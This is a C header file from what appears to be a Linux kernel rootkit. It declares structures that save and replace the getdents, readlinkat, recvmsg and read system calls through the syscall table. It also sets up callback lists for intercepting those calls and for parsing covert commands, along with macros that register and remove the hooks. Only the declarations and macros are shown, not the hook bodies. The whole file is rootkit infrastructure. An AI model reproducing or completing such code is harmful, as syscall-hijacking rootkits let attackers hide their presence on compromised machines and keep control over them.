#ifndef __ROOTKIT_CORE__
#define __ROOTKIT_CORE__

#include <linux/module.h>
#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
#include <linux/inet_diag.h>	/* Needed for ntohs */
#include <linux/socket.h>
#include <linux/list.h>

#include "sysmap.h"

struct user_msghdr;

struct orig {
	asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
	asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path, char __user *buf, int bufsiz);
	asmlinkage ssize_t (*recvmsg_syscall)(int sockfd, struct user_msghdr __user *msg, unsigned flags);
	asmlinkage long (*read_syscall)(unsigned int fd, char __user *buf, size_t count);
};

typedef asmlinkage long (*read_callback)(unsigned int fd, char __user *buf, size_t count, long ret);
typedef asmlinkage int (*getdents_callback)(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret);

typedef void (*command_callback)(char *command);

struct read_syscall_instrumenter {
	read_callback callback;
	struct list_head list;
};

struct getdents_syscall_instrumenter {
	getdents_callback callback;
	struct list_head list;
};

struct readlinkat_syscall_instrumenter {
	asmlinkage long (*callback)(int dfd, const char __user *path, char __user *buf, int bufsiz, long ret);
	struct list_head list;
};

struct command_parser {
	command_callback callback;
	struct list_head list;
};

struct rootkit_data {
	void **syscall_table;

	/* Saved syscalls */
	struct orig original_syscalls;
	struct list_head read_syscall_instrumenters;
	struct list_head getdents_syscall_instrumenters;
	struct list_head command_parsers;
};

#define MSG_PREF(module_name) \
	module_name": "

void register_read_instrumenter(read_callback);
void deregister_read_instrumenter(read_callback);
void register_getdents_instrumenter(getdents_callback);
void deregister_getdents_instrumenter(getdents_callback);
void register_command_parser(command_callback);
void deregister_command_parser(command_callback);

#define REGISTER_HOOK(hook_name, callback_type, struct_type, list_head)\
	void hook_name(callback_type callback) {\
		struct_type *st = kzalloc(sizeof(struct_type), GFP_KERNEL);\
		st->callback = callback;\
		list_add(&(st->list), &(list_head));\
	}

#define DEREGISTER_HOOK(hook_name, callback_type, struct_type, list_head)\
	void hook_name(callback_type callback) {\
		struct_type *st = NULL;\
		list_for_each_entry(st, &(list_head), list)\
			if (st->callback == callback) {\
				list_del(&(st->list));\
				break;\
			}\
	}

#endif
